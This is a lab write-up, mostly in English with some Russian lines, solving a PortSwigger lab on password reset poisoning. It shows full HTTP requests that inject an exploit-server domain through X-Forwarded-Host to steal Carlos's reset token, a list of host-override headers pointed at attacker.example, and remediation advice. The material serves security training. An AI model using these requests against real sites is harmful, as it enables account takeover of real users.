# Password Reset Poisoning via Middleware

> 🔗 Laboratory: https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware#  
> 🎯 Theme: Password reset poisoning via middleware  
> 🧪 Level: Practioner
> ✅ Status: Solved 

---

## 📚 Table of Contents

- [Password Reset Poisoning via Middleware](#password-reset-poisoning-via-middleware)
  - [📚 Table of Contents](#-table-of-contents)
  - [🎯 Lab Objective](#-lab-objective)
  - [🧠 Required Knowledge](#-required-knowledge)
  - [💥 Vulnerability Overview](#-vulnerability-overview)
  - [🔐 Normal and Vulnerable Flow](#-normal-and-vulnerable-flow)
  - [🔎 Reconnaissance](#-reconnaissance)
  - [🧪 Testing X-Forwarded-Host](#-testing-x-forwarded-host)
  - [🎯 Poisoning the Link for Carlos](#-poisoning-the-link-for-carlos)
  - [🛰 Stealing the Token](#-stealing-the-token)
  - [🔓 Using the Token](#-using-the-token)
  - [🧩 Complete Attack Chain](#-complete-attack-chain)
  - [⚙️ Why the Attack Worked](#️-why-the-attack-worked)
  - [🧠 How to Think Like a Pentester](#-how-to-think-like-a-pentester)
  - [🧪 Headers to Test](#-headers-to-test)
  - [🛑 Common Mistakes](#-common-mistakes)
    - [Mistake 1. Modifying only Host](#mistake-1-modifying-only-host)
    - [Mistake 2. Attacking Carlos immediately](#mistake-2-attacking-carlos-immediately)
    - [Mistake 3. Using the Exploit Server to reset the password](#mistake-3-using-the-exploit-server-to-reset-the-password)
    - [Mistake 4. Treating 404 as failure](#mistake-4-treating-404-as-failure)
    - [Mistake 5. Copying an incomplete token](#mistake-5-copying-an-incomplete-token)
    - [Mistake 6. Waiting for Carlos's email](#mistake-6-waiting-for-carloss-email)
  - [🛡 Remediation](#-remediation)
    - [1. Use a fixed base URL](#1-use-a-fixed-base-url)
    - [2. Do not trust client-supplied proxy headers](#2-do-not-trust-client-supplied-proxy-headers)
    - [3. Enforce a domain allowlist](#3-enforce-a-domain-allowlist)
    - [4. Reject unknown hosts](#4-reject-unknown-hosts)
    - [5. Use one-time tokens](#5-use-one-time-tokens)
    - [6. Use a short expiration time](#6-use-a-short-expiration-time)
    - [7. Invalidate old sessions](#7-invalidate-old-sessions)
    - [8. Avoid exposing secrets in URLs](#8-avoid-exposing-secrets-in-urls)
  - [✅ Checklist](#-checklist)
    - [Reconnaissance](#reconnaissance)
    - [Header testing](#header-testing)
    - [Exploitation](#exploitation)
  - [🧾 Conclusion](#-conclusion)

---

## 🎯 Lab Objective

Gain access to the `carlos` account through a vulnerable password reset mechanism.

To solve the lab:
- determine how the application builds the reset link;
- test whether proxy headers are trusted;
- replace the hostname in the link;
- capture the token on the Exploit Server;
- reuse the token on the legitimate domain;
- change Carlos's password and log in.

---

## 🧠 Required Knowledge

A secure password reset flow:
1. The user submits an account name.
2. The server creates a one-time token.
3. The server builds a link on a trusted domain.
4. The link is sent by email.
5. The user opens the link and chooses a new password.

Secure URL:
```text
https://example.com/forgot-password?token=ABCDEF
```

A dangerous implementation derives the domain from a client-controlled HTTP header.

---

## 💥 Vulnerability Overview

The application trusts the header:
```http
X-Forwarded-Host
```

This header is normally added by a reverse proxy or load balancer.

Typical architecture:
```text
Internet
   |
   v
Cloudflare
   |
   v
Nginx
   |
   v
Application
```

If the application accepts `X-Forwarded-Host` directly from clients, an attacker can inject an arbitrary domain.

---

## 🔐 Normal and Vulnerable Flow

Secure flow:
```text
User -> Application -> Email -> Legitimate website
```

Vulnerable flow:
```text
Attacker
   | POST /forgot-password
   | username=carlos
   | X-Forwarded-Host=exploit-server
   v
Приложение
   | creates a poisoned link
   v
Carlos's email
   | victim opens the link
   v
Exploit Server
   | token appears in Access Log
   v
Attacker
```

---

## 🔎 Reconnaissance

Intercept a normal password reset request for your own account:
```http
POST /forgot-password HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

Send the request to Burp Repeater.

Goals:
- identify the endpoint;
- identify the username parameter;
- test header influence;
- inspect the email for your own account.

---

## 🧪 Testing X-Forwarded-Host

Add a test header:
```http
X-Forwarded-Host: test.example.com
```

Full request:
```http
POST /forgot-password HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
X-Forwarded-Host: test.example.com
Content-Type: application/x-www-form-urlencoded

username=wiener
```

The Email Client contains:
```text
https://test.example.com/forgot-password?temp-forgot-password-token=...
```

This confirms that the application uses `X-Forwarded-Host` when constructing the reset URL.

---

## 🎯 Poisoning the Link for Carlos

Copy the Exploit Server hostname and send:
```http
POST /forgot-password HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
X-Forwarded-Host: exploit-0a1200aa04aa00008000000000000000.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

Critical values:
```text
username=carlos
```
и:
```http
X-Forwarded-Host: <домен Exploit Server>
```

The server emails Carlos a genuine reset token inside an attacker-controlled URL.

---

## 🛰 Stealing the Token

Open:
```text
Exploit Server -> Access log
```

The access log contains:
```http
GET /forgot-password?temp-forgot-password-token=do3au3tw50unahqat7ab2ms2g3bg6sp8 HTTP/1.1
Host: exploit-0a1200aa04aa00008000000000000000.exploit-server.net
```

Stolen token:
```text
do3au3tw50unahqat7ab2ms2g3bg6sp8
```

`404 Not Found` does not mean failure.
The request has already been logged and the token has leaked.

---

## 🔓 Using the Token

Move the token to the legitimate lab domain:
```text
https://0a88003804ca288e8d52a59a004600df.web-security-academy.net/forgot-password?temp-forgot-password-token=do3au3tw50unahqat7ab2ms2g3bg6sp8
```

Open the URL in the browser.
The server recognizes Carlos's valid token and displays the password reset form.

Example new password:
```text
Pentest123!
```

After changing the password, log in:
```http
POST /login HTTP/2
Host: 0a88003804ca288e8d52a59a004600df.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=carlos&password=Pentest123%21
```

---

## 🧩 Complete Attack Chain

```text
1. Перехватить POST /forgot-password
2. Отправить запрос в Repeater
3. Добавить X-Forwarded-Host
4. Проверить подмену на wiener
5. Подставить домен Exploit Server
6. Изменить username на carlos
7. Отправить запрос
8. Открыть Access Log
9. Найти temp-forgot-password-token
10. Перенести токен на реальный домен
11. Открыть форму сброса
12. Установить новый пароль
13. Войти как carlos
```

---

## ⚙️ Why the Attack Worked

The attack worked because several weaknesses were combined:

1. The application trusts an external `X-Forwarded-Host`.
2. The header influences a sensitive function.
3. The reset token is placed in the URL.
4. The victim opens the link.
5. The token can be reused from another device.
6. The token is not bound to the original domain.

Conceptually vulnerable code:
```python
host = request.headers.get("X-Forwarded-Host")
reset_url = "https://" + host + "/forgot-password?token=" + token
```

---

## 🧠 How to Think Like a Pentester

When testing password recovery, ask:

- Откуда приложение берёт домен?
- Можно ли влиять на `Host`?
- Используется ли `X-Forwarded-Host`?
- Поддерживается ли `Forwarded`?
- Есть ли `X-Host` или `X-Forwarded-Server`?
- Передаётся ли токен в query string?
- Привязан ли токен к пользователю?
- Привязан ли токен к сессии?
- Можно ли использовать токен с другого устройства?
- Инвалидируется ли токен после применения?
- Есть ли срок действия?

---

## 🧪 Headers to Test

Test one at a time:
```http
Host: attacker.example
```
```http
X-Forwarded-Host: attacker.example
```
```http
X-Host: attacker.example
```
```http
X-Forwarded-Server: attacker.example
```
```http
X-HTTP-Host-Override: attacker.example
```
```http
Forwarded: host=attacker.example
```

---

## 🛑 Common Mistakes

### Mistake 1. Modifying only Host
The application may rely only on `X-Forwarded-Host`.

### Mistake 2. Attacking Carlos immediately
First confirm the behavior with `wiener`.

### Mistake 3. Using the Exploit Server to reset the password
The token must be moved to the legitimate domain.

Wrong:
```text
https://exploit-server.net/forgot-password?token=...
```

Correct:
```text
https://academy.net/forgot-password?token=...
```

### Mistake 4. Treating 404 as failure
404 only means the route is absent on the Exploit Server.

### Mistake 5. Copying an incomplete token
Copy the entire value without spaces or truncation.

### Mistake 6. Waiting for Carlos's email
The victim's mailbox is unavailable. You need the victim's request in the Access Log.

---

## 🛡 Remediation

### 1. Use a fixed base URL
```python
BASE_URL = "https://example.com"
reset_url = BASE_URL + "/forgot-password?token=" + token
```

### 2. Do not trust client-supplied proxy headers
The reverse proxy should strip incoming values and set trusted ones.

### 3. Enforce a domain allowlist
```python
ALLOWED_HOSTS = ["example.com", "www.example.com"]
```

### 4. Reject unknown hosts
```http
HTTP/1.1 400 Bad Request
```

### 5. Use one-time tokens
Invalidate the token immediately after a successful password change.

### 6. Use a short expiration time
Expiration should be measured in minutes, not hours or days.

### 7. Invalidate old sessions
Existing sessions should normally be revoked after a password change.

### 8. Avoid exposing secrets in URLs
URLs may leak through browser history, logs, analytics, and Referer headers.

---

## ✅ Checklist

### Reconnaissance
- [ ] Найден endpoint восстановления
- [ ] Определён параметр пользователя
- [ ] Запрос отправлен в Repeater
- [ ] Изучено письмо собственного пользователя

### Header testing
- [ ] Проверен `Host`
- [ ] Проверен `X-Forwarded-Host`
- [ ] Проверен `Forwarded`
- [ ] Проверен `X-Host`
- [ ] Подтверждено изменение домена в email

### Exploitation
- [ ] Подставлен Exploit Server
- [ ] Указан `carlos`
- [ ] Запрос отправлен
- [ ] Access Log проверен
- [ ] Токен извлечён
- [ ] Токен перенесён на реальный домен
- [ ] Пароль изменён
- [ ] Выполнен вход как Carlos

---

## 🧾 Conclusion

The application used the client-controlled `X-Forwarded-Host` header to construct an absolute password reset URL.

Attacker подменил домен на Exploit Server и инициировал сброс для Carlos.

After the victim followed the link, the token appeared in the Access Log.

The token was reused on the legitimate lab domain, allowing Carlos's password to be changed.

Main lesson:
```text
Never use untrusted HTTP headers
to construct password reset links.
```

---

[⬆ Back to top](#password-reset-poisoning-via-middleware)